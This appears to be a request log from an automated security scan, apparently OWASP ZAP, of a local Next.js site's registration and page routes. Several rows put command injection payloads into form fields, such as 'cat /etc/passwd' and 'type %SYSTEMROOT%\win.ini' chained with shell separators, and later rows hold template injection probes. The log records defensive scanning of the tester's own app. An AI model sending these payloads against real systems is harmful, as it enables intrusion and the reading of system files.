1931,Fri Sep 25 14:41:12 IST 2026,Fri Sep 25 14:41:12 IST 2026,GET,http://localhost:3000/register?confirmPassword=ZAP&email=zaproxy%40example.com&membershipType=monthly&name=ZAP&password=ZAP&phone=9999999999&sport=Cricket%22%3Bcat+%2Fetc%2Fpasswd%3B%22,200,OK,54,335,18993
1932,Fri Sep 25 14:41:12 IST 2026,Fri Sep 25 14:41:12 IST 2026,GET,http://localhost:3000/register?confirmPassword=ZAP&email=zaproxy%40example.com&membershipType=monthly&name=ZAP&password=ZAP&phone=9999999999&sport=Cricket%27%26cat+%2Fetc%2Fpasswd%26%27,200,OK,57,335,18989
1933,Fri Sep 25 14:41:12 IST 2026,Fri Sep 25 14:41:12 IST 2026,GET,http://localhost:3000/register?confirmPassword=ZAP&email=zaproxy%40example.com&membershipType=monthly&name=ZAP&password=ZAP&phone=9999999999&sport=Cricket%27%3Bcat+%2Fetc%2Fpasswd%3B%27,200,OK,50,335,18969
1934,Fri Sep 25 14:41:12 IST 2026,Fri Sep 25 14:41:12 IST 2026,GET,http://localhost:3000/register?confirmPassword=ZAP&email=zaproxy%40example.com&membershipType=monthly&name=ZAP&password=ZAP&phone=9999999999&sport=type+%25SYSTEMROOT%25%5Cwin.ini,200,OK,55,335,18967
1935,Fri Sep 25 14:41:12 IST 2026,Fri Sep 25 14:41:12 IST 2026,GET,http://localhost:3000/register?confirmPassword=ZAP&email=zaproxy%40example.com&membershipType=monthly&name=ZAP&password=ZAP&phone=9999999999&sport=Cricket%26type+%25SYSTEMROOT%25%5Cwin.ini,200,OK,51,335,19013
1936,Fri Sep 25 14:41:12 IST 2026,Fri Sep 25 14:41:12 IST 2026,GET,http://localhost:3000/register?confirmPassword=ZAP&email=zaproxy%40example.com&membershipType=monthly&name=ZAP&password=ZAP&phone=9999999999&sport=Cricket%7Ctype+%25SYSTEMROOT%25%5Cwin.ini,200,OK,53,335,19003
1937,Fri Sep 25 14:41:12 IST 2026,Fri Sep 25 14:41:12 IST 2026,GET,http://localhost:3000/register?confirmPassword=ZAP&email=zaproxy%40example.com&membershipType=monthly&name=ZAP&password=ZAP&phone=9999999999&sport=Cricket%22%26type+%25SYSTEMROOT%25%5Cwin.ini%26%22,200,OK,56,335,19067
1938,Fri Sep 25 14:41:12 IST 2026,Fri Sep 25 14:41:12 IST 2026,GET,http://localhost:3000/register?confirmPassword=ZAP&email=zaproxy%40example.com&membershipType=monthly&name=ZAP&password=ZAP&phone=9999999999&sport=Cricket%22%7Ctype+%25SYSTEMROOT%25%5Cwin.ini,200,OK,53,335,19021
1939,Fri Sep 25 14:41:12 IST 2026,Fri Sep 25 14:41:12 IST 2026,GET,http://localhost:3000/register?confirmPassword=ZAP&email=zaproxy%40example.com&membershipType=monthly&name=ZAP&password=ZAP&phone=9999999999&sport=Cricket%27%26type+%25SYSTEMROOT%25%5Cwin.ini%26%27,200,OK,57,335,19043
1940,Fri Sep 25 14:41:12 IST 2026,Fri Sep 25 14:41:12 IST 2026,GET,http://localhost:3000/register?confirmPassword=ZAP&email=zaproxy%40example.com&membershipType=monthly&name=ZAP&password=ZAP&phone=9999999999&sport=Cricket%27%7Ctype+%25SYSTEMROOT%25%5Cwin.ini,200,OK,62,335,19009
1941,Fri Sep 25 14:41:12 IST 2026,Fri Sep 25 14:41:12 IST 2026,GET,http://localhost:3000/register?confirmPassword=ZAP&email=zaproxy%40example.com&membershipType=monthly&name=ZAP&password=ZAP&phone=9999999999&sport=get-help,200,OK,49,335,18875
1942,Fri Sep 25 14:41:12 IST 2026,Fri Sep 25 14:41:12 IST 2026,GET,http://localhost:3000/register?confirmPassword=ZAP&email=zaproxy%40example.com&membershipType=monthly&name=ZAP&password=ZAP&phone=9999999999&sport=Cricket%3Bget-help,200,OK,50,335,18911
1943,Fri Sep 25 14:41:12 IST 2026,Fri Sep 25 14:41:12 IST 2026,GET,http://localhost:3000/register?confirmPassword=ZAP&email=zaproxy%40example.com&membershipType=monthly&name=ZAP&password=ZAP&phone=9999999999&sport=Cricket%22%3Bget-help,200,OK,52,335,18929
1944,Fri Sep 25 14:41:12 IST 2026,Fri Sep 25 14:41:12 IST 2026,GET,http://localhost:3000/register?confirmPassword=ZAP&email=zaproxy%40example.com&membershipType=monthly&name=ZAP&password=ZAP&phone=9999999999&sport=Cricket%27%3Bget-help,200,OK,48,335,18917
1945,Fri Sep 25 14:41:12 IST 2026,Fri Sep 25 14:41:12 IST 2026,GET,http://localhost:3000/register?confirmPassword=ZAP&email=zaproxy%40example.com&membershipType=monthly&name=ZAP&password=ZAP&phone=9999999999&sport=Cricket%3Bget-help+%23,200,OK,52,335,18925
1946,Fri Sep 25 14:41:12 IST 2026,Fri Sep 25 14:41:13 IST 2026,GET,http://localhost:3000/?_rsc=%22%27,200,OK,118,303,2878
1947,Fri Sep 25 14:41:13 IST 2026,Fri Sep 25 14:41:13 IST 2026,GET,http://localhost:3000/?_rsc=%3C%21--,200,OK,50,303,2878
1948,Fri Sep 25 14:41:12 IST 2026,Fri Sep 25 14:41:13 IST 2026,GET,http://localhost:3000,200,OK,195,533,27949
1949,Fri Sep 25 14:41:13 IST 2026,Fri Sep 25 14:41:13 IST 2026,GET,http://localhost:3000/?_rsc=%5D%5D%3E,200,OK,29,303,2878
1950,Fri Sep 25 14:41:13 IST 2026,Fri Sep 25 14:41:13 IST 2026,GET,http://localhost:3000/__nextjs_font,404,Not Found,101,341,9953
1951,Fri Sep 25 14:41:13 IST 2026,Fri Sep 25 14:41:13 IST 2026,GET,http://localhost:3000/_next,404,Not Found,47,341,9945
1952,Fri Sep 25 14:41:13 IST 2026,Fri Sep 25 14:41:13 IST 2026,GET,http://localhost:3000/_next/static,404,Not Found,45,341,9956
1953,Fri Sep 25 14:41:13 IST 2026,Fri Sep 25 14:41:13 IST 2026,GET,http://localhost:3000/_next/static/chunks,404,Not Found,6,265,9
1954,Fri Sep 25 14:41:13 IST 2026,Fri Sep 25 14:41:13 IST 2026,GET,http://localhost:3000/_next/static/chunks/app,404,Not Found,5,265,9
1955,Fri Sep 25 14:41:13 IST 2026,Fri Sep 25 14:41:13 IST 2026,GET,http://localhost:3000/_next/static/chunks/app/about,404,Not Found,4,265,9
1956,Fri Sep 25 14:41:13 IST 2026,Fri Sep 25 14:41:13 IST 2026,GET,http://localhost:3000/_next/static/chunks/app/contact,404,Not Found,7,265,9
1957,Fri Sep 25 14:41:13 IST 2026,Fri Sep 25 14:41:13 IST 2026,GET,http://localhost:3000/_next/static/chunks/app/faq,404,Not Found,6,265,9
1958,Fri Sep 25 14:41:13 IST 2026,Fri Sep 25 14:41:13 IST 2026,GET,http://localhost:3000/_next/static/chunks/app/login,404,Not Found,10,265,9
1959,Fri Sep 25 14:41:13 IST 2026,Fri Sep 25 14:41:13 IST 2026,GET,http://localhost:3000/_next/static/chunks/app/register,404,Not Found,4,265,9
1960,Fri Sep 25 14:41:13 IST 2026,Fri Sep 25 14:41:13 IST 2026,GET,http://localhost:3000/_next/static/css,404,Not Found,6,265,9
1961,Fri Sep 25 14:41:13 IST 2026,Fri Sep 25 14:41:13 IST 2026,GET,http://localhost:3000/_next/static/css/app,404,Not Found,7,265,9
1962,Fri Sep 25 14:41:13 IST 2026,Fri Sep 25 14:41:13 IST 2026,GET,http://localhost:3000/_next/static/chunks/webpack.js?v=%22%27,200,OK,47,342,142828
1963,Fri Sep 25 14:41:13 IST 2026,Fri Sep 25 14:41:13 IST 2026,GET,http://localhost:3000/_next/static/chunks/main-app.js?v=%22%27,200,OK,74,345,11938274
1964,Fri Sep 25 14:41:13 IST 2026,Fri Sep 25 14:41:14 IST 2026,GET,http://localhost:3000/_next/static/chunks/webpack.js?v=%3C%21--,200,OK,4,342,142828
1965,Fri Sep 25 14:41:14 IST 2026,Fri Sep 25 14:41:14 IST 2026,GET,http://localhost:3000/_next/static/css/app/layout.css?v=%22%27,200,OK,20,327,71262
1966,Fri Sep 25 14:41:14 IST 2026,Fri Sep 25 14:41:14 IST 2026,GET,http://localhost:3000/_next/static/css/app/layout.css?v=%3C%21--,200,OK,6,327,71262
1967,Fri Sep 25 14:41:14 IST 2026,Fri Sep 25 14:41:14 IST 2026,GET,http://localhost:3000/_next/static/chunks/webpack.js?v=%5D%5D%3E,200,OK,7,342,142828
1968,Fri Sep 25 14:41:14 IST 2026,Fri Sep 25 14:41:14 IST 2026,GET,http://localhost:3000/_next/static/css/app/layout.css?v=%5D%5D%3E,200,OK,3,327,71262
1969,Fri Sep 25 14:41:14 IST 2026,Fri Sep 25 14:41:14 IST 2026,GET,http://localhost:3000/_next/static/media,404,Not Found,5,265,9
1970,Fri Sep 25 14:41:14 IST 2026,Fri Sep 25 14:41:14 IST 2026,GET,http://localhost:3000/_next/webpack-hmr?id=%22%27,101,Switching Protocols,1,129,0
1971,Fri Sep 25 14:41:14 IST 2026,Fri Sep 25 14:41:14 IST 2026,GET,http://localhost:3000/_next/webpack-hmr?id=%3C%21--,101,Switching Protocols,3,129,0
1972,Fri Sep 25 14:41:14 IST 2026,Fri Sep 25 14:41:14 IST 2026,GET,http://localhost:3000/_next/webpack-hmr?id=%5D%5D%3E,101,Switching Protocols,70,129,0
1973,Fri Sep 25 14:41:14 IST 2026,Fri Sep 25 14:41:14 IST 2026,GET,http://localhost:3000/about?_rsc=%22%27,200,OK,86,303,3854
1974,Fri Sep 25 14:41:14 IST 2026,Fri Sep 25 14:41:14 IST 2026,GET,http://localhost:3000/contact?_rsc=%22%27,200,OK,99,303,3866
1975,Fri Sep 25 14:41:14 IST 2026,Fri Sep 25 14:41:14 IST 2026,GET,http://localhost:3000/faq?_rsc=%22%27,200,OK,79,303,3842
1976,Fri Sep 25 14:41:14 IST 2026,Fri Sep 25 14:41:14 IST 2026,GET,http://localhost:3000/about?_rsc=%3C%21--,200,OK,119,303,3854
1977,Fri Sep 25 14:41:14 IST 2026,Fri Sep 25 14:41:14 IST 2026,GET,http://localhost:3000/contact?_rsc=%3C%21--,200,OK,114,303,3866
1978,Fri Sep 25 14:41:14 IST 2026,Fri Sep 25 14:41:14 IST 2026,GET,http://localhost:3000/favicon.ico?603d046c9a6fdfbb=%22%27,200,OK,136,315,25931
1979,Fri Sep 25 14:41:14 IST 2026,Fri Sep 25 14:41:14 IST 2026,GET,http://localhost:3000/faq?_rsc=%3C%21--,200,OK,142,303,3842
1980,Fri Sep 25 14:41:14 IST 2026,Fri Sep 25 14:41:14 IST 2026,GET,http://localhost:3000/about?_rsc=%5D%5D%3E,200,OK,143,303,3854
1981,Fri Sep 25 14:41:14 IST 2026,Fri Sep 25 14:41:14 IST 2026,GET,http://localhost:3000/contact?_rsc=%5D%5D%3E,200,OK,138,303,3866
1982,Fri Sep 25 14:41:14 IST 2026,Fri Sep 25 14:41:14 IST 2026,GET,http://localhost:3000/faq?_rsc=%5D%5D%3E,200,OK,102,303,3842
1983,Fri Sep 25 14:41:14 IST 2026,Fri Sep 25 14:41:14 IST 2026,GET,http://localhost:3000/images,404,Not Found,299,341,9946
1984,Fri Sep 25 14:41:14 IST 2026,Fri Sep 25 14:41:14 IST 2026,GET,http://localhost:3000/favicon.ico?603d046c9a6fdfbb=%3C%21--,200,OK,168,315,25931
1985,Fri Sep 25 14:41:14 IST 2026,Fri Sep 25 14:41:14 IST 2026,GET,http://localhost:3000/favicon.ico?603d046c9a6fdfbb=%5D%5D%3E,200,OK,4,315,25931
1986,Fri Sep 25 14:41:14 IST 2026,Fri Sep 25 14:41:15 IST 2026,GET,http://localhost:3000/_next/static/chunks/main-app.js?v=%3C%21--,200,OK,463,345,11938274
1987,Fri Sep 25 14:41:15 IST 2026,Fri Sep 25 14:41:15 IST 2026,GET,http://localhost:3000/login?_rsc=%22%27,200,OK,33,303,3854
1988,Fri Sep 25 14:41:15 IST 2026,Fri Sep 25 14:41:15 IST 2026,GET,http://localhost:3000/login?_rsc=%3C%21--,200,OK,85,303,3854
1989,Fri Sep 25 14:41:15 IST 2026,Fri Sep 25 14:41:15 IST 2026,GET,http://localhost:3000/register?confirmPassword=%22%27&email=zaproxy%40example.com&membershipType=monthly&name=ZAP&password=ZAP&phone=9999999999&sport=Cricket,200,OK,122,335,18883
1990,Fri Sep 25 14:41:15 IST 2026,Fri Sep 25 14:41:15 IST 2026,GET,http://localhost:3000/login?_rsc=%5D%5D%3E,200,OK,33,303,3854
1991,Fri Sep 25 14:41:15 IST 2026,Fri Sep 25 14:41:15 IST 2026,GET,http://localhost:3000/register?confirmPassword=%3C%21--&email=zaproxy%40example.com&membershipType=monthly&name=ZAP&password=ZAP&phone=9999999999&sport=Cricket,200,OK,107,335,18891
1992,Fri Sep 25 14:41:15 IST 2026,Fri Sep 25 14:41:15 IST 2026,GET,http://localhost:3000/register?confirmPassword=%5D%5D%3E&email=zaproxy%40example.com&membershipType=monthly&name=ZAP&password=ZAP&phone=9999999999&sport=Cricket,200,OK,84,335,18893
1993,Fri Sep 25 14:41:15 IST 2026,Fri Sep 25 14:41:15 IST 2026,GET,http://localhost:3000/register?confirmPassword=ZAP&email=%22%27&membershipType=monthly&name=ZAP&password=ZAP&phone=9999999999&sport=Cricket,200,OK,54,335,18815
1994,Fri Sep 25 14:41:15 IST 2026,Fri Sep 25 14:41:16 IST 2026,GET,http://localhost:3000/register?confirmPassword=ZAP&email=%3C%21--&membershipType=monthly&name=ZAP&password=ZAP&phone=9999999999&sport=Cricket,200,OK,57,335,18823
1995,Fri Sep 25 14:41:16 IST 2026,Fri Sep 25 14:41:16 IST 2026,GET,http://localhost:3000/register?confirmPassword=ZAP&email=%5D%5D%3E&membershipType=monthly&name=ZAP&password=ZAP&phone=9999999999&sport=Cricket,200,OK,73,335,18825
1996,Fri Sep 25 14:41:16 IST 2026,Fri Sep 25 14:41:16 IST 2026,GET,http://localhost:3000/register?confirmPassword=ZAP&email=zaproxy%40example.com&membershipType=%22%27&name=ZAP&password=ZAP&phone=9999999999&sport=Cricket,200,OK,61,335,18867
1997,Fri Sep 25 14:41:16 IST 2026,Fri Sep 25 14:41:16 IST 2026,GET,http://localhost:3000/register?confirmPassword=ZAP&email=zaproxy%40example.com&membershipType=%3C%21--&name=ZAP&password=ZAP&phone=9999999999&sport=Cricket,200,OK,56,335,18875
1998,Fri Sep 25 14:41:16 IST 2026,Fri Sep 25 14:41:16 IST 2026,GET,http://localhost:3000/register?confirmPassword=ZAP&email=zaproxy%40example.com&membershipType=%5D%5D%3E&name=ZAP&password=ZAP&phone=9999999999&sport=Cricket,200,OK,54,335,18877
1999,Fri Sep 25 14:41:16 IST 2026,Fri Sep 25 14:41:16 IST 2026,GET,http://localhost:3000/register?confirmPassword=ZAP&email=zaproxy%40example.com&membershipType=monthly&name=%22%27&password=ZAP&phone=9999999999&sport=Cricket,200,OK,63,335,18883
2000,Fri Sep 25 14:41:16 IST 2026,Fri Sep 25 14:41:16 IST 2026,GET,http://localhost:3000/register?confirmPassword=ZAP&email=zaproxy%40example.com&membershipType=monthly&name=%3C%21--&password=ZAP&phone=9999999999&sport=Cricket,200,OK,60,335,18891
2001,Fri Sep 25 14:41:16 IST 2026,Fri Sep 25 14:41:16 IST 2026,GET,http://localhost:3000/register?confirmPassword=ZAP&email=zaproxy%40example.com&membershipType=monthly&name=%5D%5D%3E&password=ZAP&phone=9999999999&sport=Cricket,200,OK,52,335,18893
2002,Fri Sep 25 14:41:16 IST 2026,Fri Sep 25 14:41:16 IST 2026,GET,http://localhost:3000/register?confirmPassword=ZAP&email=zaproxy%40example.com&membershipType=monthly&name=ZAP&password=%22%27&phone=9999999999&sport=Cricket,200,OK,58,335,18883
2003,Fri Sep 25 14:41:15 IST 2026,Fri Sep 25 14:41:16 IST 2026,GET,http://localhost:3000/_next/static/chunks/main-app.js?v=%5D%5D%3E,200,OK,872,345,11938274
2004,Fri Sep 25 14:41:16 IST 2026,Fri Sep 25 14:41:16 IST 2026,GET,http://localhost:3000/register?confirmPassword=ZAP&email=zaproxy%40example.com&membershipType=monthly&name=ZAP&password=%3C%21--&phone=9999999999&sport=Cricket,200,OK,90,335,18891
2005,Fri Sep 25 14:41:17 IST 2026,Fri Sep 25 14:41:17 IST 2026,GET,http://localhost:3000/register?confirmPassword=ZAP&email=zaproxy%40example.com&membershipType=monthly&name=ZAP&password=%5D%5D%3E&phone=9999999999&sport=Cricket,200,OK,63,335,18893
2006,Fri Sep 25 14:41:17 IST 2026,Fri Sep 25 14:41:17 IST 2026,GET,http://localhost:3000/register?confirmPassword=ZAP&email=zaproxy%40example.com&membershipType=monthly&name=ZAP&password=ZAP&phone=%22%27&sport=Cricket,200,OK,55,335,18855
2007,Fri Sep 25 14:41:17 IST 2026,Fri Sep 25 14:41:17 IST 2026,GET,http://localhost:3000/register?confirmPassword=ZAP&email=zaproxy%40example.com&membershipType=monthly&name=ZAP&password=ZAP&phone=%3C%21--&sport=Cricket,200,OK,53,335,18863
2008,Fri Sep 25 14:41:17 IST 2026,Fri Sep 25 14:41:17 IST 2026,GET,http://localhost:3000/register?confirmPassword=ZAP&email=zaproxy%40example.com&membershipType=monthly&name=ZAP&password=ZAP&phone=%5D%5D%3E&sport=Cricket,200,OK,51,335,18865
2009,Fri Sep 25 14:41:17 IST 2026,Fri Sep 25 14:41:17 IST 2026,GET,http://localhost:3000/register?confirmPassword=ZAP&email=zaproxy%40example.com&membershipType=monthly&name=ZAP&password=ZAP&phone=9999999999&sport=%22%27,200,OK,57,335,18867
2010,Fri Sep 25 14:41:17 IST 2026,Fri Sep 25 14:41:17 IST 2026,GET,http://localhost:3000/register?confirmPassword=ZAP&email=zaproxy%40example.com&membershipType=monthly&name=ZAP&password=ZAP&phone=9999999999&sport=%3C%21--,200,OK,50,335,18875
2011,Fri Sep 25 14:41:17 IST 2026,Fri Sep 25 14:41:17 IST 2026,GET,http://localhost:3000/register?confirmPassword=ZAP&email=zaproxy%40example.com&membershipType=monthly&name=ZAP&password=ZAP&phone=9999999999&sport=%5D%5D%3E,200,OK,53,335,18877
2012,Fri Sep 25 14:41:17 IST 2026,Fri Sep 25 14:41:17 IST 2026,GET,http://localhost:3000,200,OK,92,533,27949
2013,Fri Sep 25 14:41:17 IST 2026,Fri Sep 25 14:41:17 IST 2026,GET,http://localhost:3000/__nextjs_font,404,Not Found,69,341,9953
2014,Fri Sep 25 14:41:17 IST 2026,Fri Sep 25 14:41:17 IST 2026,GET,http://localhost:3000/_next,404,Not Found,39,341,9945
2015,Fri Sep 25 14:41:17 IST 2026,Fri Sep 25 14:41:18 IST 2026,GET,http://localhost:3000/_next/static,404,Not Found,46,341,9956
2016,Fri Sep 25 14:41:18 IST 2026,Fri Sep 25 14:41:18 IST 2026,GET,http://localhost:3000/_next/static/chunks,404,Not Found,4,265,9
2017,Fri Sep 25 14:41:18 IST 2026,Fri Sep 25 14:41:18 IST 2026,GET,http://localhost:3000/_next/static/chunks/app,404,Not Found,5,265,9
2018,Fri Sep 25 14:41:18 IST 2026,Fri Sep 25 14:41:18 IST 2026,GET,http://localhost:3000/_next/static/chunks/app/about,404,Not Found,6,265,9
2019,Fri Sep 25 14:41:18 IST 2026,Fri Sep 25 14:41:18 IST 2026,GET,http://localhost:3000/_next/static/chunks/app/contact,404,Not Found,5,265,9
2020,Fri Sep 25 14:41:18 IST 2026,Fri Sep 25 14:41:18 IST 2026,GET,http://localhost:3000/_next/static/chunks/app/faq,404,Not Found,5,265,9
2021,Fri Sep 25 14:41:18 IST 2026,Fri Sep 25 14:41:18 IST 2026,GET,http://localhost:3000/_next/static/chunks/app/login,404,Not Found,4,265,9
2022,Fri Sep 25 14:41:18 IST 2026,Fri Sep 25 14:41:18 IST 2026,GET,http://localhost:3000/_next/static/chunks/app/register,404,Not Found,5,265,9
2023,Fri Sep 25 14:41:18 IST 2026,Fri Sep 25 14:41:18 IST 2026,GET,http://localhost:3000/_next/static/css,404,Not Found,7,265,9
2024,Fri Sep 25 14:41:18 IST 2026,Fri Sep 25 14:41:18 IST 2026,GET,http://localhost:3000/_next/static/css/app,404,Not Found,5,265,9
2025,Fri Sep 25 14:41:18 IST 2026,Fri Sep 25 14:41:18 IST 2026,GET,http://localhost:3000/_next/static/media,404,Not Found,5,265,9
2026,Fri Sep 25 14:41:18 IST 2026,Fri Sep 25 14:41:18 IST 2026,GET,http://localhost:3000/images,404,Not Found,41,341,9946
2027,Fri Sep 25 14:41:18 IST 2026,Fri Sep 25 14:41:18 IST 2026,GET,http://localhost:3000/?_rsc=zj+5404*9428+zj,200,OK,60,303,2878
2028,Fri Sep 25 14:41:18 IST 2026,Fri Sep 25 14:41:18 IST 2026,GET,http://localhost:3000,200,OK,101,533,27949
2029,Fri Sep 25 14:41:18 IST 2026,Fri Sep 25 14:41:18 IST 2026,GET,http://localhost:3000/?_rsc=zj%7B3396*8674%7Dzj,200,OK,28,303,2878
2030,Fri Sep 25 14:41:18 IST 2026,Fri Sep 25 14:41:18 IST 2026,GET,http://localhost:3000/?_rsc=zj%24%7B6700*7819%7Dzj,200,OK,27,303,2878
2031,Fri Sep 25 14:41:18 IST 2026,Fri Sep 25 14:41:18 IST 2026,GET,http://localhost:3000/?_rsc=zj%23%7B1256*7020%7Dzj,200,OK,68,303,2878
2032,Fri Sep 25 14:41:18 IST 2026,Fri Sep 25 14:41:18 IST 2026,GET,http://localhost:3000/__nextjs_font,404,Not Found,125,341,9953
2033,Fri Sep 25 14:41:18 IST 2026,Fri Sep 25 14:41:18 IST 2026,GET,http://localhost:3000/?_rsc=zj%7B%238029*2618%7Dzj,200,OK,31,303,2878
2034,Fri Sep 25 14:41:18 IST 2026,Fri Sep 25 14:41:18 IST 2026,GET,http://localhost:3000/?_rsc=zj%7B%404523*4242%7Dzj,200,OK,54,303,2878
2035,Fri Sep 25 14:41:18 IST 2026,Fri Sep 25 14:41:18 IST 2026,GET,http://localhost:3000/_next,404,Not Found,98,341,9945
2036,Fri Sep 25 14:41:18 IST 2026,Fri Sep 25 14:41:18 IST 2026,GET,http://localhost:3000/?_rsc=zj%7B%7B3409*2507%7D%7Dzj,200,OK,34,303,2878
2037,Fri Sep 25 14:41:18 IST 2026,Fri Sep 25 14:41:18 IST 2026,GET,http://localhost:3000/?_rsc=zj%7B%7B%3D6245*8631%7D%7Dzj,200,OK,27,303,2878
2038,Fri Sep 25 14:41:18 IST 2026,Fri Sep 25 14:41:18 IST 2026,GET,http://localhost:3000/?_rsc=zj%3C%25%3D7879*2087%25%3Ezj,200,OK,62,303,2878
2039,Fri Sep 25 14:41:18 IST 2026,Fri Sep 25 14:41:18 IST 2026,GET,http://localhost:3000/_next/static,404,Not Found,125,341,9956
2040,Fri Sep 25 14:41:18 IST 2026,Fri Sep 25 14:41:19 IST 2026,GET,http://localhost:3000/?_rsc=zj%23set%28%24x%3D8219*8376%29%24%7Bx%7Dzj,200,OK,33,303,2878
2041,Fri Sep 25 14:41:19 IST 2026,Fri Sep 25 14:41:19 IST 2026,GET,http://localhost:3000/?_rsc=zj%3Cp+th%3Atext%3D%22%24%7B5541*6361%7D%22%3E%3C%2Fp%3Ezj,200,OK,32,303,2878
2042,Fri Sep 25 14:41:19 IST 2026,Fri Sep 25 14:41:19 IST 2026,GET,http://localhost:3000/?_rsc=zj%7B%40math+key%3D%228439%22+method%3D%22multiply%22+operand%3D%224785%22%2F%7Dzj,200,OK,26,303,2878
2043,Fri Sep 25 14:41:18 IST 2026,Fri Sep 25 14:41:19 IST 2026,GET,http://localhost:3000/_next/static/chunks,404,Not Found,88,265,9
2044,Fri Sep 25 14:41:19 IST 2026,Fri Sep 25 14:41:19 IST 2026,GET,http://localhost:3000/?_rsc=zj%7B%7B44290%7Cadd%3A51440%7D%7Dzj,200,OK,27,303,2878
2045,Fri Sep 25 14:41:19 IST 2026,Fri Sep 25 14:41:19 IST 2026,GET,http://localhost:3000/?_rsc=zj%7B%7Bprint+%226301%22+%228825%22%7D%7Dzj,200,OK,25,303,2878
2046,Fri Sep 25 14:41:19 IST 2026,Fri Sep 25 14:41:19 IST 2026,GET,http://localhost:3000/_next/static/chunks/app,404,Not Found,53,265,9
2047,Fri Sep 25 14:41:19 IST 2026,Fri Sep 25 14:41:19 IST 2026,GET,http://localhost:3000/_next/static/chunks/app/about,404,Not Found,2,265,9
2048,Fri Sep 25 14:41:19 IST 2026,Fri Sep 25 14:41:19 IST 2026,GET,http://localhost:3000/_next/static/chunks/app/contact,404,Not Found,5,265,9
2049,Fri Sep 25 14:41:19 IST 2026,Fri Sep 25 14:41:19 IST 2026,GET,http://localhost:3000/_next/static/chunks/app/faq,404,Not Found,5,265,9
2050,Fri Sep 25 14:41:19 IST 2026,Fri Sep 25 14:41:19 IST 2026,GET,http://localhost:3000/_next/static/chunks/app/login,404,Not Found,5,265,9
2051,Fri Sep 25 14:41:19 IST 2026,Fri Sep 25 14:41:19 IST 2026,GET,http://localhost:3000/_next/static/chunks/app/register,404,Not Found,9,265,9
2052,Fri Sep 25 14:41:19 IST 2026,Fri Sep 25 14:41:19 IST 2026,GET,http://localhost:3000/_next/static/chunks/webpack.js?v=zj+5789*3450+zj,200,OK,6,342,142828
2053,Fri Sep 25 14:41:19 IST 2026,Fri Sep 25 14:41:19 IST 2026,GET,http://localhost:3000/_next/static/css,404,Not Found,9,265,9
2054,Fri Sep 25 14:41:19 IST 2026,Fri Sep 25 14:41:19 IST 2026,GET,http://localhost:3000/_next/static/chunks/webpack.js?v=zj%7B8564*8206%7Dzj,200,OK,28,342,142828
2055,Fri Sep 25 14:41:19 IST 2026,Fri Sep 25 14:41:19 IST 2026,GET,http://localhost:3000/_next/static/css/app,404,Not Found,29,265,9
2056,Fri Sep 25 14:41:19 IST 2026,Fri Sep 25 14:41:19 IST 2026,GET,http://localhost:3000/_next/static/chunks/main-app.js?v=zj+2621*9039+zj,200,OK,140,345,11938274
2057,Fri Sep 25 14:41:19 IST 2026,Fri Sep 25 14:41:19 IST 2026,GET,http://localhost:3000/_next/static/chunks/webpack.js?v=zj%24%7B8777*4981%7Dzj,200,OK,8,342,142828
2058,Fri Sep 25 14:41:19 IST 2026,Fri Sep 25 14:41:19 IST 2026,GET,http://localhost:3000/_next/static/media,404,Not Found,18,265,9
2059,Fri Sep 25 14:41:19 IST 2026,Fri Sep 25 14:41:19 IST 2026,GET,http://localhost:3000/_next/static/css/app/layout.css?v=zj+3055*9766+zj,200,OK,12,327,71262
2060,Fri Sep 25 14:41:20 IST 2026,Fri Sep 25 14:41:20 IST 2026,GET,http://localhost:3000/_next/static/chunks/webpack.js?v=zj%23%7B5023*9408%7Dzj,200,OK,4,342,142828
2061,Fri Sep 25 14:41:20 IST 2026,Fri Sep 25 14:41:20 IST 2026,GET,http://localhost:3000/_next/static/chunks/webpack.js?v=zj%7B%238989*7803%7Dzj,200,OK,9,342,142828
2062,Fri Sep 25 14:41:20 IST 2026,Fri Sep 25 14:41:20 IST 2026,GET,http://localhost:3000/_next/static/css/app/layout.css?v=zj%7B4915*3190%7Dzj,200,OK,7,327,71262
2063,Fri Sep 25 14:41:20 IST 2026,Fri Sep 25 14:41:20 IST 2026,GET,http://localhost:3000/_next/webpack-hmr?id=zj+5883*6024+zj,101,Switching Protocols,3,129,0
2064,Fri Sep 25 14:41:20 IST 2026,Fri Sep 25 14:41:20 IST 2026,GET,http://localhost:3000/_next/static/css/app/layout.css?v=zj%24%7B8581*6041%7Dzj,200,OK,9,327,71262
2065,Fri Sep 25 14:41:20 IST 2026,Fri Sep 25 14:41:20 IST 2026,GET,http://localhost:3000/_next/static/chunks/webpack.js?v=zj%7B%401650*4131%7Dzj,200,OK,8,342,142828
2066,Fri Sep 25 14:41:20 IST 2026,Fri Sep 25 14:41:20 IST 2026,GET,http://localhost:3000/_next/webpack-hmr?id=zj%7B6845*3997%7Dzj,101,Switching Protocols,1,129,0
2067,Fri Sep 25 14:41:20 IST 2026,Fri Sep 25 14:41:20 IST 2026,GET,http://localhost:3000/_next/webpack-hmr?id=zj%24%7B4561*8198%7Dzj,101,Switching Protocols,4,129,0
2068,Fri Sep 25 14:41:20 IST 2026,Fri Sep 25 14:41:21 IST 2026,GET,http://localhost:3000/_next/static/chunks/webpack.js?v=zj%7B%7B6588*9511%7D%7Dzj,200,OK,75,342,142828
2069,Fri Sep 25 14:41:20 IST 2026,Fri Sep 25 14:41:21 IST 2026,GET,http://localhost:3000/_next/webpack-hmr?id=zj%23%7B7858*3121%7Dzj,101,Switching Protocols,44,129,0
2070,Fri Sep 25 14:41:20 IST 2026,Fri Sep 25 14:41:21 IST 2026,GET,http://localhost:3000/_next/static/css/app/layout.css?v=zj%23%7B7603*6145%7Dzj,200,OK,69,327,71262
2071,Fri Sep 25 14:41:20 IST 2026,Fri Sep 25 14:41:21 IST 2026,GET,http://localhost:3000/about?_rsc=zj+7416*3391+zj,200,OK,60,303,3854
2072,Fri Sep 25 14:41:20 IST 2026,Fri Sep 25 14:41:21 IST 2026,GET,http://localhost:3000/contact?_rsc=zj+5049*2536+zj,200,OK,84,303,3866
2073,Fri Sep 25 14:41:21 IST 2026,Fri Sep 25 14:41:21 IST 2026,GET,http://localhost:3000/_next/webpack-hmr?id=zj%7B%234627*8833%7Dzj,101,Switching Protocols,42,129,0
2074,Fri Sep 25 14:41:21 IST 2026,Fri Sep 25 14:41:21 IST 2026,GET,http://localhost:3000/faq?_rsc=zj+9613*8865+zj,200,OK,97,303,3842
2075,Fri Sep 25 14:41:21 IST 2026,Fri Sep 25 14:41:21 IST 2026,GET,http://localhost:3000/_next/webpack-hmr?id=zj%7B%401992*2791%7Dzj,101,Switching Protocols,108,129,0
2076,Fri Sep 25 14:41:21 IST 2026,Fri Sep 25 14:41:21 IST 2026,GET,http://localhost:3000/about?_rsc=zj%7B5371*5031%7Dzj,200,OK,151,303,3854
